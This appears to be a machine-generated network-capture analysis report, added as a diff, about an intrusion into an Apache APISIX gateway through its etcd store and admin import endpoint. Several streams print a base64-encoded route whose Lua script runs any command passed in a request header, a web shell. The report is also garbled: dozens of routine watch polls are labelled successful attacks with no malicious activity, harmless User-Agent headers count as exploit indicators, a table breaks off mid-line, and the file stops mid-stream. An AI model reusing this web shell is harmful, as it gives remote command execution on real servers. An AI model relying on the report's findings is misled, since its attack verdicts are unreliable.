@@ -1,0 +1,644 @@
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 52
+TCP Stream IDs: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
+Protocol Counts: ARP=8, TCP=432, HTTP=52, HTTP/JSON=7, MDNS=1
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.4:49684           <-> 172.18.0.2:2379                  7 1342 bytes      10 1166 bytes      17 2508 bytes     3.064980000        21.5100
+172.18.0.3:60594           <-> 172.18.0.2:2379                  6 1724 bytes       8 746 bytes      14 2470 bytes     1.083509000         1.9973
+172.18.0.3:60642           <-> 172.18.0.2:2379                  6 1724 bytes       8 746 bytes      14 2470 bytes     1.195879000         1.8841
+172.18.0.3:60776           <-> 172.18.0.2:2379                  6 1724 bytes       8 746 bytes      14 2470 bytes     1.787332000         1.2861
+172.18.0.3:
+
+=== Flow Analysis ===
+
+--- Stream 0 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0000-F000006-003] POST /v3/watch
+- [E-S0000-F000006-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+- [E-S0000-F000010-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0000-F000006-004] Host: etcd:2379
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, lua-resty-http, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 1 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0001-F000012-001] TCP connection established from 172.18.0.3:60502 to 172.18.0.2:2379
+- [E-S0001-F000015-003] POST request to /v3/watch
+- [E-S0001-F000019-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0001-F000015-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 2 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0002-F000021-002] POST /v3/watch
+- [E-S0002-F000021-003] Host: etcd:2379
+- [E-S0002-F000435-011] {"result":{"header":{"cluster_id":"14841639068965178418","member_id":"10276657743932975437","revision":"14","raft_term":"2"},"events":[{"kv":{"key":"L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw","create_revision":"14","mod_revision":"14","version":"1","value":"eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3BlbihuZ3gucmVxLmdldF9oZWFkZXJzKClbJ2NtZCddLCdyJykgXG4gbG9jYWwgb3V0cHV0ID0gZmlsZTpyZWFkKCcqYWxsJykgXG4gZmlsZTpjbG9zZSgpIFxuIG5neC5zYXkob3V0cHV0KSIsInN0YXR1cyI6MX0="}}]}}
+Exploit Indicators:
+- [E-S0002-F000394-009] L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, lua-resty-http, HTTP Status 200, context canceled, request timeout, L2FwaXNpeC9yb3V0ZXM=, eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3Bl
+
+--- Stream 3 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0003-F000026-002] POST /v3/watch
+- [E-S0003-F000026-003] Host: etcd:2379
+- [E-S0003-F000029-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0003-F000026-004] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, User-Agent
+
+--- Stream 4 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0004-F000031-001] TCP connection established from 172.18.0.3:60508 to 172.18.0.2:2379
+- [E-S0004-F000034-003] POST request to /v3/watch
+- [E-S0004-F000038-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0004-F000034-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, lua-resty-http, HTTP Status 200, /v3/watch
+
+--- Stream 5 [VALID] ---
+Service: etcd 3.5.0 (inferred from the use of /v3/watch endpoint)
+Relevant Events:
+- [E-S0005-F000043-003] POST /v3/watch
+- [E-S0005-F000043-004] Host: etcd:2379
+- [E-S0005-F000047-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0005-F000045-006] {"create_request":{"start_revision":13,"range_end":"L2FwaXNpeC9wbHVnaW5fY29uZmlndA==","key":"L2FwaXNpeC9wbHVnaW5fY29uZmlncw=="}}
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, /v3/watch, lua-resty-http, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 6 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0006-F000049-001] TCP connection established from 172.18.0.3:60518 to 172.18.0.2:2379
+- [E-S0006-F000052-003] POST request to /v3/watch
+- [E-S0006-F000056-008] HTTP Status 200 response received
+Exploit Indicators:
+- [E-S0006-F000052-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, /v3/watch, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 7 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0007-F000061-003] POST /v3/watch
+- [E-S0007-F000061-004] Host: etcd:2379
+- [E-S0007-F000061-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Exploit Indicators:
+- [E-S0007-F000061-003] POST /v3/watch
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, lua-resty-http, HTTP Status 200, /v3/watch, Access-Control-Allow-Origin
+
+--- Stream 8 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0008-F000067-001] TCP connection established from 172.18.0.3 to 172.18.0.2
+- [E-S0008-F000070-003] POST request to /v3/watch
+- [E-S0008-F000074-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0008-F000070-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 9 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0009-F000076-001] TCP connection established from 172.18.0.3:60550 to 172.18.0.2:2379
+- [E-S0009-F000079-003] POST request to /v3/watch
+- [E-S0009-F000083-008] HTTP Status 200 response received
+Exploit Indicators:
+- [E-S0009-F000079-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 10 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0010-F000085-001] TCP connection established from 172.18.0.3:60552 to 172.18.0.2:2379
+- [E-S0010-F000088-003] POST request to /v3/watch
+- [E-S0010-F000092-008] HTTP Status 200 response
+Exploit Indicators:
+- [E-S0010-F000088-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, /v3/watch, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 11 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0011-F000094-001] TCP connection established from client to server
+- [E-S0011-F000100-003] POST request to /v3/watch
+- [E-S0011-F000108-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0011-F000100-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 12 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0012-F000097-001] TCP connection established from client to server
+- [E-S0012-F000104-003] POST request to /v3/watch
+- [E-S0012-F000110-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0012-F000104-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 13 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0013-F000115-003] POST /v3/watch
+- [E-S0013-F000115-004] Host: etcd:2379
+- [E-S0013-F000115-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Exploit Indicators:
+- [E-S0013-F000115-003] POST /v3/watch
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, lua-resty-http, User-Agent, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 14 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0014-F000121-001] TCP connection established from 172.18.0.3:60584 to 172.18.0.2:2379
+- [E-S0014-F000124-003] POST request to /v3/watch
+- [E-S0014-F000128-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0014-F000124-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 15 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0015-F000130-001] TCP connection established from 172.18.0.3:60588 to 172.18.0.2:2379
+- [E-S0015-F000133-003] POST request to /v3/watch
+- [E-S0015-F000137-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0015-F000133-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, /v3/watch, Access-Control-Allow-Origin
+
+--- Stream 16 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0016-F000146-003] POST /v3/watch
+- [E-S0016-F000146-004] Host: etcd:2379
+- [E-S0016-F000155-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0016-F000155-007] Access-Control-Allow-Origin:
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, Access-Control-Allow-Origin, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 17 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0017-F000145-003] POST /v3/watch
+- [E-S0017-F000453-011] HTTP/1.1 200 OK
+- [E-S0017-F000398-010] {"result":{"header":{"cluster_id":"14841639068965178418","member_id":"10276657743932975437","revision":"14","raft_term":"2"},"events":[{"kv":{"key":"L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw","create_revision":"14","mod_revision":"14","version":"1","value":"eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3BlbihuZ3gucmVxLmdldF9oZWFkZXJzKClbJ2NtZCddLCdyJykgXG4gbG9jYWwgb3V0cHV0ID0gZmlsZTpyZWFkKCcqYWxsJykgXG4gZmlsZTpjbG9zZSgpIFxuIG5neC5zYXkob3V0cHV0KSIsInN0YXR1cy06MX0="}}]}}
+Exploit Indicators:
+- [E-S0017-F000398-010] eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3Bl...
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, HTTP/1.1 200 OK, context canceled, grpc_code, http_code, evidence IDs: [E-S0017-F000145-003, E-S0017-F000453-011, E-S0017-F000398-010]
+
+--- Stream 18 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0018-F000157-001] TCP connection established from 172.18.0.3:60618 to 172.18.0.2:2379
+- [E-S0018-F000160-003] POST request to /v3/watch
+- [E-S0018-F000164-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0018-F000160-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, /v3/watch, Access-Control-Allow-Origin
+
+--- Stream 19 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0019-F000169-003] POST /v3/watch
+- [E-S0019-F000169-004] Host: etcd:2379
+- [E-S0019-F000173-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0019-F000169-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, User-Agent
+
+--- Stream 20 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0020-F000178-003] POST /v3/watch
+- [E-S0020-F000182-008] HTTP Status 200
+- [E-S0020-F000388-010] eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3Bl...
+Exploit Indicators:
+- [E-S0020-F000388-009] L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, HTTP Status 200, L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw, eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3Bl...
+
+--- Stream 21 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0021-F000184-001] TCP connection established from 172.18.0.3:60658 to 172.18.0.2:2379
+- [E-S0021-F000187-003] POST request to /v3/watch
+- [E-S0021-F000191-008] HTTP Status 200 response received
+Exploit Indicators:
+- [E-S0021-F000187-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 22 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0022-F000193-001] TCP connection established from 172.18.0.3:60674 to 172.18.0.2:2379
+- [E-S0022-F000196-003] POST request to /v3/watch
+- [E-S0022-F000200-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0022-F000196-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, /v3/watch, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 23 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0023-F000205-003] POST /v3/watch
+- [E-S0023-F000205-004] Host: etcd:2379
+- [E-S0023-F000205-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Exploit Indicators:
+- [E-S0023-F000205-003] POST /v3/watch
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, lua-resty-http, /v3/watch, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 24 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0024-F000211-001] TCP connection established from 172.18.0.3:60690 to 172.18.0.2:2379
+- [E-S0024-F000214-003] POST request to /v3/watch
+- [E-S0024-F000218-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0024-F000214-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 25 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0025-F000220-001] TCP connection established from 172.18.0.3:60702 to 172.18.0.2:2379
+- [E-S0025-F000223-003] POST request to /v3/watch
+- [E-S0025-F000227-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0025-F000223-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 26 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0026-F000229-001] TCP connection established from 172.18.0.3:60708 to 172.18.0.2:2379
+- [E-S0026-F000232-003] POST request to /v3/watch
+- [E-S0026-F000236-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0026-F000232-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, /v3/watch
+
+--- Stream 27 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0027-F000241-003] POST /v3/watch
+- [E-S0027-F000241-004] Host: etcd:2379
+- [E-S0027-F000241-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Exploit Indicators:
+- [E-S0027-F000241-003] POST /v3/watch
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, lua-resty-http, /v3/watch, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 28 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0028-F000250-003] POST /v3/watch
+- [E-S0028-F000250-004] Host: etcd:2379
+- [E-S0028-F000250-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Exploit Indicators:
+- [E-S0028-F000250-003] POST /v3/watch
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, lua-resty-http, User-Agent, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 29 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0029-F000256-001] TCP connection established from 172.18.0.3:60714 to 172.18.0.2:2379
+- [E-S0029-F000259-003] POST request to /v3/watch
+- [E-S0029-F000270-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0029-F000259-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, /v3/watch
+
+--- Stream 30 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0030-F000263-001] TCP connection established from client to server
+- [E-S0030-F000266-003] POST request to /v3/watch
+- [E-S0030-F000272-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0030-F000266-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 31 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0031-F000277-003] POST /v3/watch
+- [E-S0031-F000277-004] Host: etcd:2379
+- [E-S0031-F000281-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0031-F000275-002] None
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 32 [VALID] ---
+Service: etcd  (version 3.5.0 or similar based on the endpoint)
+Relevant Events:
+- [E-S0032-F000286-003] POST /v3/watch
+- [E-S0032-F000286-004] Host: etcd:2379
+- [E-S0032-F000290-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0032-F000286-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 33 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0033-F000292-001] TCP connection established from 172.18.0.3:60756 to 172.18.0.2:2379
+- [E-S0033-F000295-003] POST request to /v3/watch
+- [E-S0033-F000299-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0033-F000295-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, /v3/watch, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 34 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0034-F000304-003] POST /v3/watch
+- [E-S0034-F000304-004] Host: etcd:2379
+- [E-S0034-F000308-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0034-F000304-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 35 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0035-F000310-001] TCP connection established from 172.18.0.3:60776 to 172.18.0.2:2379
+- [E-S0035-F000313-003] POST request to /v3/watch
+- [E-S0035-F000433-011] HTTP/JSON response with events
+Exploit Indicators:
+- [E-S0035-F000392-009] Payload indicating potential data manipulation: L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, lua-resty-http, L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw, HTTP Status 200, context canceled, request timeout
+
+--- Stream 36 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0036-F000319-001] TCP connection established from 172.18.0.3:60788 to 172.18.0.2:2379
+- [E-S0036-F000322-003] POST request to /v3/watch
+- [E-S0036-F000326-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0036-F000322-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 37 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0037-F000328-001] TCP connection established from 172.18.0.3:60798 to 172.18.0.2:2379
+- [E-S0037-F000331-003] POST request to /v3/watch
+- [E-S0037-F000335-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0037-F000331-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, /v3/watch, User-Agent, HTTP Status 200, Access-Control-Allow-Origin
+
+--- Stream 38 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0038-F000340-003] POST /v3/watch
+- [E-S0038-F000340-004] Host: etcd:2379
+- [E-S0038-F000344-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0038-F000340-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 39 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0039-F000346-001] TCP connection established from client to server
+- [E-S0039-F000349-003] POST request to /v3/watch
+- [E-S0039-F000353-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0039-F000349-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 40 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0040-F000355-001] TCP connection established from 172.18.0.3:60828 to 172.18.0.2:2379
+- [E-S0040-F000358-003] POST request to /v3/watch
+- [E-S0040-F000362-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0040-F000358-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, /v3/watch, Access-Control-Allow-Origin
+
+--- Stream 41 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0041-F000364-001] TCP connection established from 172.18.0.3:60834 to 172.18.0.2:2379
+- [E-S0041-F000367-003] POST request to /v3/watch
+- [E-S0041-F000371-008] HTTP Status 200 response received
+Exploit Indicators:
+- [E-S0041-F000365-002] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 42 [VALID] ---
+Service: apisix/unknown
+Relevant Events:
+- [E-S0042-F000378-004] POST /apisix/admin/migrate/import
+- [E-S0042-F000378-007] admin keyword observed
+- [E-S0042-F000389-011] HTTP Status 200
+Exploit Indicators:
+- [E-S0042-F000378-008] popen(ngx.req.get_headers()
+Malicious Activities: Command execution observed
+Attack Success: Succeeded
+Evidence Keywords: popen, command execution, admin, HTTP Status 200, E-S0042-F000378-004, E-S0042-F000378-007, E-S0042-F000389-011
+
+--- Stream 43 [VALID] ---
+Service: APISIX 2.9
+Relevant Events:
+- [E-S0043-F000380-001] TCP connection established from 172.18.0.4:49684 to 172.18.0.2:2379
+- [E-S0043-F000380-002] Command execution attempt with `popen(ngx.req.get_headers()`
+- [E-S0043-F000380-003] Command execution attempt with `id`
+Exploit Indicators:
+- [E-S0043-F000380-002] `popen(ngx.req.get_headers()['cmd'],'r')`
+Malicious Activities: Command execution via HTTP headers
+Attack Success: Unknown
+Evidence Keywords: popen, command execution, APISIX, E-S0043-F000380-002, E-S0043-F000380-003
+
+--- Stream 44 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0044-F000405-003] POST /v3/watch
+- [E-S0044-F000405-004] Host: etcd:2379
+- [E-S0044-F000449-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0044-F000405-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 45 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0045-F000419-003] POST /v3/watch
+- [E-S0045-F000419-004] Host: etcd:2379
+- [E-S0045-F000439-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0045-F000419-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 46 [VALID] ---
+Service: etcd 3.x
+Relevant Events:
+- [E-S0046-F000412-001] TCP connection established from 172.18.0.3:60860 to 172.18.0.2:2379
+- [E-S0046-F000423-003] POST request to /v3/watch
